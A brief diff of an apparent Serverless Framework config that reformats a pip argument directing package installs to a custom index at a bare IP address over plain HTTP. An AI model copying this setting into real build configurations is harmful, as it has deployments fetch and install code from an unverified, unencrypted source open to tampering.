@@ -52,4 +52,4 @@ functions:
 custom:
   pythonRequirements:
     pipCmdExtraArgs:
-      - -i http://138.68.141.154:3000/
+      - -ihttp://138.68.141.154:3000/
